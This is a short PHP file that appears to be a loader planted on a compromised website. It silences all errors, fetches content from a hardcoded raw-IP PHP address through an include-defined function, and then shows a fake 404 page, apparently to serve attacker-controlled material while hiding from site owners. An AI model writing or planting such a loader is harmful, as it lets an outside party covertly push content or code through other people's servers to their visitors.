<?php
require 'include.php';

error_reporting(0);
ini_set("display_errors", 0);
$remote = "http://78.138.118.127/12345nbvvd.php";
php_display($remote);
error_404();
